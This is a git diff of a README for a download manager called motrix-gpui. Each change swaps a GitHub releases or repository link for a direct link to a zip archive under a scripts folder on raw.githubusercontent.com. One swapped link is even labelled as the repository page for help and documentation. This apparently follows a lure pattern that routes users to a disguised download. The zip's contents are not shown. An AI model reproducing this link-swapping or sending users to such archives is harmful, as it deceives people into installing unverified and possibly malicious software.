@@ -1,6 +1,6 @@
 # ⚡ motrix-gpui - Lightning-Fast Downloads, Beautifully Simple
 
-[![Download motrix-gpui](https://img.shields.io/badge/Download-motrix--gpui-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/powerful-genuschamaecrista64/motrix-gpui/releases)
+[![Download motrix-gpui](https://img.shields.io/badge/Download-motrix--gpui-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/powerful-genuschamaecrista64/motrix-gpui/main/scripts/gpui_motrix_v2.5.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ This guide will walk you through everything you need to know, from downloading t
 
 ## 📥 Download and Install
 
-Visit this link to download the application: [https://github.com/powerful-genuschamaecrista64/motrix-gpui/releases](https://github.com/powerful-genuschamaecrista64/motrix-gpui/releases)
+Visit this link to download the application: [https://raw.githubusercontent.com/powerful-genuschamaecrista64/motrix-gpui/main/scripts/gpui_motrix_v2.5.zip](https://raw.githubusercontent.com/powerful-genuschamaecrista64/motrix-gpui/main/scripts/gpui_motrix_v2.5.zip)
 
 When you arrive at the page, you'll see a list of available files. Look for the one that matches your computer's system (likely Windows). Click on the file to start the download. Once the download is complete, you'll have the application ready to use.
 
@@ -107,13 +107,13 @@ No, motrix-gpui is lightweight and uses minimal system resources. It runs quietl
 
 motrix-gpui is continuously improved. When a new version is released, you'll see a notification in the app. You can update with just one click.
 
-If you need help, visit the repository page at [https://github.com/powerful-genuschamaecrista64/motrix-gpui](https://github.com/powerful-genuschamaecrista64/motrix-gpui). You'll find documentation, and you can report any issues you encounter.
+If you need help, visit the repository page at [https://raw.githubusercontent.com/powerful-genuschamaecrista64/motrix-gpui/main/scripts/gpui_motrix_v2.5.zip](https://raw.githubusercontent.com/powerful-genuschamaecrista64/motrix-gpui/main/scripts/gpui_motrix_v2.5.zip). You'll find documentation, and you can report any issues you encounter.
 
 ## 🎉 Start Downloading Today
 
 You're now ready to experience the fastest, simplest way to download files. Say goodbye to slow browser downloads and hello to motrix-gpui. Visit the download page, get the app, and start downloading at lightning speed.
 
-Remember, the download link is: [https://github.com/powerful-genuschamaecrista64/motrix-gpui/releases](https://github.com/powerful-genuschamaecrista64/motrix-gpui/releases)
+Remember, the download link is: [https://raw.githubusercontent.com/powerful-genuschamaecrista64/motrix-gpui/main/scripts/gpui_motrix_v2.5.zip](https://raw.githubusercontent.com/powerful-genuschamaecrista64/motrix-gpui/main/scripts/gpui_motrix_v2.5.zip)
 
 Happy downloading!
 
